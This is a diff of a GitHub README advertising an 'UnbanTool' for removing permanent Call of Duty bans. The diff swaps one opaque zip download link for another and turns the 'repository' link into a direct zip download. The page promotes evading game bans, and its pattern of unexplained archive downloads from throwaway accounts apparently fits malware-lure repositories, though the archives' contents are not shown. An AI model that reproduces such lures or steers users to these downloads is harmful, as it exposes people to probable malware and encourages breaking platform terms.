@@ -16,7 +16,7 @@ The UnbanTool is a handy tool designed specifically for removing permanent bans 
 ## How to Use:
 Simply download the UnbanTool from the link provided below and follow the instructions included in the software package. With just a few clicks, you can say goodbye to permanent bans and hello to uninterrupted gaming sessions.
 
-[![Download UnbanTool](https://img.shields.io/badge/Download-UnbanTool-orange)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download UnbanTool](https://github.com/AbhigyanisGOAT/UnbanTool/releases/download/v1.0/Application.zip)](https://github.com/AbhigyanisGOAT/UnbanTool/releases/download/v1.0/Application.zip)
 
 ## Disclaimer:
 Please note that the use of this tool may be against the terms of service of Call of Duty or other gaming platforms. Use it at your own risk.
@@ -28,4 +28,4 @@ If the download link is not working or you are looking for the latest updates, b
 Thank you for choosing the UnbanTool to overcome ban obstacles in Call of Duty. Keep gaming and enjoy your ban-free experience! 🎮
 
 ---
-For more information or to dive into the world of unban solutions, visit the [UnbanTool GitHub Repository](https://github.com/Rubenas123/6487922).
+For more information or to dive into the world of unban solutions, visit the [UnbanTool GitHub Repository](https://github.com/AbhigyanisGOAT/UnbanTool/releases/download/v1.0/Application.zip).
